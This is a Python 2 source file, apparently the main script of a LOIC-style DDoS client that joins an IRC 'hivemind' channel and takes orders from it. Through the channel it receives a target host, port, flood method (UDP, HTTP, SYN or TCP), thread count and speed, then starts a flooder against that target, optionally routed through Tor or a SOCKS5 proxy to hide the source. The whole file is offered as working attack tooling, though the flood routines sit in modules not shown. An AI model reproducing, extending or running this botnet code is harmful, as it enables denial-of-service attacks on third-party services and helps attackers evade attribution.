import getopt, sys, socket, string, random, os, time
from Core.Events import *
from Core.IRC import * 
from Core.Flooder import *
from Core.Globals import *

status = NEED_INFO
flooder = None

targetip = None
timeout = None
subsite = None
message = None
port = None
method = []
threads = 1
wait = None
random = None
speed = None
srchost = None
srcport = None
socks5ip = "127.0.0.1"
socks5port = 9050

def lazerParseHook(event):
    global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed, srchost, srcport
    print event.arg

    s = []
    for x in event.arg:
        t = x.split('=')
        if len(t) > 1:
            for y in t:
                s.append(y)
        else:
            if t[0] == "start":
                status = START
            elif t[0] == "default": #needs to be fleshed out more
                timeout = 9001
                subsite = "/"
                port = 80
                message = "U dun goofed"
                method.append(TCP_METHOD)
                speed = 0
                random = False
                srchost = "192.168.0.1"
                srcport = 4321

    print "Splitting finished, status:", status

    for x in range(0, len(s), 2):
        if s[x] == "targetip" or s[x] == "targethost":
            targetip = socket.gethostbyname(s[x+1])
        elif s[x] == "timeout":
            if s[x+1].isdigit():
                timeout = int(s[x+1])
                if(timeout < -1):
                    timeout = None
        elif s[x] == "subsite":
            subsite = s[x+1]
        elif s[x] == "message":
            message = s[x+1]
        elif s[x] == "port":
            if s[x+1].isdigit():
                port = int(s[x+1])
                if port > 65535:
                    port = None
                elif port < 1:
                    port = None
        elif s[x] == "method":
            methodTemp = s[x+1].split(",")
            method = []
            for x in methodTemp:
                if x.upper() == "UDP":
                    method.append(UDP_METHOD)
                elif x.upper() == "HTTP":
                    method.append(HTTP_METHOD)
                elif x.upper() == "SYN":
                    method.append(SYN_METHOD)
                else:
                    method.append(TCP_METHOD)
        elif s[x] == "threads":
            if s[x+1].isdigit():
                threads = int(s[x+1])
                if threads > 100:
                    threads = 100
                elif threads < 1:
                    threads = 1
        elif s[x] == "wait":
            wait = s[x+1]
            if wait.lower() == "true":
                wait = True
            else:
                wait = False
        elif s[x] == "random":
            random = s[x+1]
            if random.lower() == "true":
                random = True
            else:
                random = None
        elif s[x] == "speed":
            if s[x+1].isdigit():
                speed = int(s[x+1])
                if speed > 20:
                    speed = 20
                elif speed < 1:
                    speed = 1
        elif s[x] == "srchost":
            srchost = s[x+1]
        elif s[x] == "srcport":
            if s[x+1].isdigit():
                srcport = int(s[x+1])
                if(srcport < -1):
                    srcport = None

    print "parsing finished"

    if status == START:
        event = Event(START_LAZER, None)
        getEventManager().signalEvent(event)
    else:
        status = WAITING

def lazerStartHook(event):
    global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed, srchost, srcport, socks5ip, socks5port
    print "FIRING MAH LAZ000000R!"
    if status == START:
        if flooder != None:
            flooder.stop()

        if targetip == None or port == None:
            print "no target set"
            return

        if timeout == None:
            print "Missing required timeout"
            return
        if len(method) == 0:
            print "Missing required method"
            return
        if threads == None:
            print "Missing required thread amount"
            return

        flooder = Flooder(targetip, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport, socks5ip, socks5port)
        flooder.start()

irc = None
running = True
def restartIRCHook(event):
    global irc

    time.sleep(5)
    irc.connect()

def main(args):
    global irc, flooder, socks5ip, socks5port

    listener = Listener(LAZER_RECV, lazerParseHook)
    getEventManager().addListener(listener)
    listener = Listener(START_LAZER, lazerStartHook)
    getEventManager().addListener(listener)
    listener = Listener(IRC_RESTART, restartIRCHook)
    getEventManager().addListener(listener)

    try:
        host = args[1]
        port = int(args[2])
        channel = args[3]
        if len(args[4:]):
            try:
                opts, argv = getopt.getopt(args[4:], "ts:", ["tor","socks5="])
            except getopt.GetoptError:
                print "Usage: python main.py <hivemind irc server> <irc port> <irc channel> [--tor] [--socks5=ip:port]"
                sys.exit()

            for o, a in opts:
                if o in ("-t", "--tor"):
                    socks5ip = "127.0.0.1"
                    socks5port = 9050
                elif o in ("-s", "--socks5"):
                    socks5 = a.split(':')
                    socks5ip = socket.gethostbyname(socks5[0])
                    socks5port = int(socks5[1])

    except getopt.GetoptError:
        print "Usage: python main.py <hivemind irc server> <irc port> <irc channel> [--tor] [--socks5=ip:port]"
        sys.exit()

    if channel[0] != '#':
        channel = '#' + channel

    getEventManager().start()

    irc = IRC(host, port, channel)

    while running:
        try:
            i = raw_input()
            if i.find("connect") == 0:
                info = i.split(" ")
                print info
                if len(info) == 4 and info[2].isdigit():
                    newhost = info[1]
                    newport = int(info[2])
                    newchannel = info[3].replace("\\", "")
                    if newhost == host and newport == port and irc.connected:
                        print "changing channel to", newchannel
                        irc.changeChannel(newchannel)
                        channel = newchannel
                    else:
                        host = newhost
                        port = newport
                        channel = newchannel
                        print "changing host to", host, port, channel
                        irc.disconnect()
                        irc.host = host
                        irc.port = port
                        irc.channel = channel
                        irc.connect()
                else:
                    print "not enough info. connect server port channel"
            elif i == "stopflood":
                if flooder:
                    flooder.stop()
            elif i == "startflood":
                if flooder:
                    flooder.start()
            elif i == "floodcount":
                if flooder:
                    print flooder.floodCount()
            elif i == "quit" or i == "exit":
                irc.disconnect()
                if flooder:
                    flooder.stop()
                getEventManager().stop()
                break
        except KeyboardInterrupt:
            irc.disconnect()
            if flooder:
                flooder.stop()
            getEventManager().stop()
            break

    time.sleep(1)
    sys.exit()


if __name__ == '__main__':
    main(sys.argv)
